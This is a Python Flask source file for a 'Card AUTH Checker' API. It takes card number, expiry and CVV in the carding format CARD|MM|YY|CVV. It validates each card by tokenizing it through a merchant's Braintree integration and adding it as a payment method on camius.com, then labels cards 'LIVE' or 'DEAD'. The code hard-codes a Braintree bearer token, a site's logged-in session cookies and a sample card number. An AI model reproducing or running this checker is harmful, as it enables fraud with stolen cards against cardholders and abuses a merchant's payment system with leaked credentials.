from flask import Flask, request, jsonify
import requests
import json
import time
from datetime import datetime

app = Flask(__name__)

# Global variable to store real-time logs
live_logs = []

def log(message, status="info"):
    """Add log with timestamp and status"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        "time": timestamp,
        "message": message,
        "status": status
    }
    live_logs.append(log_entry)
    print(f"[{timestamp}] {message}")
    return log_entry


@app.route('/api/check/<path:card_data>', methods=['GET'])
def check_card_url(card_data):
    """
    URL-based card checker
    Format: /api/check/cc=4848100064672831|05|26|078
    """
    global live_logs
    live_logs = []
    
    try:
        if not card_data.startswith('cc='):
            log("❌ Invalid format", "error")
            return jsonify({
                'success': False,
                'error': 'Use format: cc=CARD|MM|YY|CVV',
                'logs': live_logs
            }), 400
        
        card_str = card_data[3:]
        parts = card_str.split('|')
        
        if len(parts) != 4:
            log("❌ Invalid card format", "error")
            return jsonify({
                'success': False,
                'error': 'Expected: CARD|MM|YY|CVV',
                'logs': live_logs
            }), 400
        
        cc, mm, yy, cvv = parts
        
        # Convert YY to YYYY
        if len(yy) == 2:
            yy = '20' + yy
        
        return check_card_logic(cc, mm, yy, cvv)
        
    except Exception as e:
        log(f"❌ Error: {str(e)}", "error")
        return jsonify({
            'success': False,
            'error': str(e),
            'logs': live_logs
        }), 500


@app.route('/api/check-card', methods=['POST'])
def check_card_post():
    """
    POST-based card checker
    """
    global live_logs
    live_logs = []
    
    try:
        data = request.json
        
        if not all(k in data for k in ['card_number', 'exp_month', 'exp_year', 'cvv']):
            log("❌ Missing required fields", "error")
            return jsonify({
                'success': False,
                'error': 'Missing: card_number, exp_month, exp_year, cvv',
                'logs': live_logs
            }), 400

        card_number = data['card_number'].replace(' ', '')
        exp_month = data['exp_month']
        exp_year = data['exp_year']
        cvv = data['cvv']
        
        # Convert YY to YYYY
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
        
        return check_card_logic(card_number, exp_month, exp_year, cvv)
        
    except Exception as e:
        log(f"❌ Error: {str(e)}", "error")
        return jsonify({
            'success': False,
            'error': str(e),
            'logs': live_logs
        }), 500


def check_card_logic(card_number, exp_month, exp_year, cvv):
    """Main card checking logic"""
    
    log("🚀 Starting AUTH check...", "info")
    log(f"💳 Card: {mask_card(card_number)}", "info")
    log(f"📅 Expiry: {exp_month}/{exp_year}", "info")
    log(f"🔒 CVV: ***", "info")
    
    # Step 1: Tokenize card (AUTH check)
    log("⏳ Authenticating card with Braintree...", "pending")
    time.sleep(0.3)
    
    result = tokenize_and_auth_card(card_number, exp_month, exp_year, cvv)
    
    if result['success']:
        log("✅ CARD AUTHENTICATED!", "success")
        log(f"🏦 Card Type: {result.get('card_type', 'Unknown')}", "success")
        log(f"🔢 BIN: {result.get('bin', 'N/A')}", "success")
        log("✅ Card details are VALID!", "success")
        
        return jsonify({
            'success': True,
            'status': 'authenticated',
            'message': 'Card authenticated successfully',
            'card': mask_card(card_number),
            'card_type': result.get('card_type'),
            'bin': result.get('bin'),
            'last4': result.get('last4'),
            'result': 'LIVE ✅',
            'logs': live_logs
        }), 200
    else:
        log("❌ AUTHENTICATION FAILED", "error")
        log(f"🚫 Reason: {result.get('error', 'Invalid card details')}", "error")
        
        return jsonify({
            'success': False,
            'status': 'declined',
            'message': 'Card authentication failed',
            'card': mask_card(card_number),
            'error': result.get('error'),
            'result': 'DEAD ❌',
            'logs': live_logs
        }), 200


def tokenize_and_auth_card(card_number, exp_month, exp_year, cvv):
    """
    Tokenize card and add payment method (AUTH check)
    Uses camius.com Braintree integration
    """
    try:
        # Step 1: Tokenize card with Braintree
        log("🔐 Tokenizing card with Braintree...", "info")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3Njk5NTQ5MjcsImp0aSI6IjgxNmZmMzhhLTRmYTktNDI2YS04ODc3LWI5MmM0Y2YxMzUzMCIsInN1YiI6IjNqNjg1d2p0ODhybnliNGIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNqNjg1d2p0ODhybnliNGIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6Ik1heGNvbUludGVybmF0aW9uYWxfaW5zdGFudCIsInBheXBhbF9jbGllbnRfaWQiOiJBZU1sUWZGZ09sTTdZRnNwMXRTTlhUVDh0VG5UaFEyNUJ3UUtXV3ItUVJfOGxIWFlha28zRTlpWHVBS2JtdjBLYjF1QXhwRVQzZDZrSzNaeCJ9fQ.OTk_H2yjMyDlx3cp7ap684DygxDmYl3DhEShw01IVPZlhzt8LH_cAgD7KjLKuPZYx9KcmLXffXN24xReddC1Zg',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': f'fc0d0af9-f9f8-4ed8-b897-{int(time.time())}',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': exp_month,
                        'expirationYear': exp_year,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': 'NY',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        log("📤 Sending to Braintree API...", "info")
        
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=json_data,
            timeout=15
        )
        
        log(f"📊 Braintree Response: {response.status_code}", "info")
        
        if response.status_code == 200:
            result = response.json()
            
            # Check for errors
            if 'errors' in result:
                error_msg = result['errors'][0].get('message', 'Unknown error')
                log(f"❌ Braintree Error: {error_msg}", "error")
                return {'success': False, 'error': error_msg}
            
            # Success
            if 'data' in result and 'tokenizeCreditCard' in result['data']:
                token_data = result['data']['tokenizeCreditCard']
                card_info = token_data['creditCard']
                
                log(f"✅ Token generated: {token_data['token'][:20]}...", "success")
                
                # Step 2: Add payment method (AUTH)
                log("⏳ Adding payment method to Camius (AUTH)...", "pending")
                
                auth_result = add_payment_method_camius(token_data['token'])
                
                if auth_result['success']:
                    return {
                        'success': True,
                        'card_type': card_info.get('brandCode', 'Unknown'),
                        'bin': card_info.get('bin', 'N/A'),
                        'last4': card_info.get('last4', '****')
                    }
                else:
                    return {'success': False, 'error': auth_result.get('error')}
        
        log("❌ Invalid response from Braintree", "error")
        return {'success': False, 'error': 'Invalid Braintree response'}
        
    except Exception as e:
        log(f"❌ Tokenization failed: {str(e)}", "error")
        return {'success': False, 'error': str(e)}


def add_payment_method_camius(payment_nonce):
    """
    Add payment method to camius.com (AUTH check)
    This validates card without charging
    """
    try:
        log("🌐 Connecting to Camius.com...", "info")
        
        cookies = {
            '_ga': 'GA1.1.156341181.1769867247',
            'omnisendSessionID': 'qttuxyimLBt8D9-20260131134727',
            'fp_logged_in_roles': 'customer',
            'wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28': '6bgdl2sgenfc|1771077618|xGnvrFxCtPNz2Yi9sYY8nV7jIKHwJJeGIxqPhypTEUA|4e1c2ae2a9dc1001841f6d963447cb4e113a0912e66a00b5cce45cf40672caac',
            'omnisendContactID': '697e0a20a50d28b1e64824ed',
            'commercekit-nonce-value': '1a98203e16',
            'commercekit-nonce-state': '1',
        }
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.camius.com',
            'referer': 'https://www.camius.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': payment_nonce,
            'braintree_cc_device_data': f'{{"device_session_id":"session_{int(time.time())}","fraud_merchant_id":null}}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/3j685wjt88rnyb4b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/3j685wjt88rnyb4b"},"merchantId":"3j685wjt88rnyb4b","venmo":"off"}',
            'woocommerce-add-payment-method-nonce': 'e0c6f77a3e',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        log("📤 Submitting AUTH request to Camius...", "info")
        
        response = requests.post(
            'https://www.camius.com/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=20,
            allow_redirects=True
        )
        
        log(f"📊 Camius Response: {response.status_code}", "info")
        
        response_text = response.text.lower()
        
        # Success indicators
        if 'payment method successfully added' in response_text or 'successfully added' in response_text:
            log("✅ Payment method added (AUTH Success)", "success")
            return {'success': True}
        
        # Check redirect to payment methods page
        if 'payment-methods' in response.url:
            log("✅ Redirected to payment methods (AUTH Success)", "success")
            return {'success': True}
        
        # Decline indicators
        if 'declined' in response_text or 'invalid' in response_text or 'failed' in response_text:
            log("❌ Card declined by processor", "error")
            return {'success': False, 'error': 'Declined by processor'}
        
        # Error check
        if 'error' in response_text or response.status_code >= 400:
            log("❌ Error from gateway", "error")
            return {'success': False, 'error': 'Gateway error'}
        
        # If status 200 without errors, consider success
        if response.status_code == 200:
            log("✅ AUTH completed (No errors detected)", "success")
            return {'success': True}
        
        log("⚠️ Unclear response", "pending")
        return {'success': False, 'error': 'Unclear response'}
        
    except Exception as e:
        log(f"❌ AUTH error: {str(e)}", "error")
        return {'success': False, 'error': str(e)}


def mask_card(card_number):
    """Mask card number"""
    if len(card_number) < 4:
        return '****'
    return f"{card_number[:6]}******{card_number[-4:]}"


@app.route('/api/logs', methods=['GET'])
def get_logs():
    """Get recent logs"""
    return jsonify(live_logs)


@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check"""
    return jsonify({
        'status': 'online',
        'service': 'Camius Card AUTH Checker',
        'version': '1.0',
        'gateway': 'camius.com',
        'type': 'real_auth_check'
    })


@app.route('/', methods=['GET'])
def index():
    """API Info"""
    return jsonify({
        "name": "Camius Card AUTH Checker API",
        "version": "1.0",
        "gateway": "camius.com (Real AUTH)",
        "endpoints": {
            "check_url": "/api/check/cc=CARD|MM|YY|CVV",
            "check_post": "/api/check-card (POST)",
            "logs": "/api/logs",
            "health": "/api/health"
        },
        "example": "/api/check/cc=4848100064672831|05|26|078"
    })


if __name__ == '__main__':
    print("=" * 60)
    print("🔐 Camius Card AUTH Checker API (Real Gateway)")
    print("=" * 60)
    print("Gateway: camius.com")
    print("Endpoint: /api/check/cc=CARD|MM|YY|CVV")
    print("Logs: /api/logs")
    print("=" * 60)
    app.run(debug=True, host='0.0.0.0', port=5002)
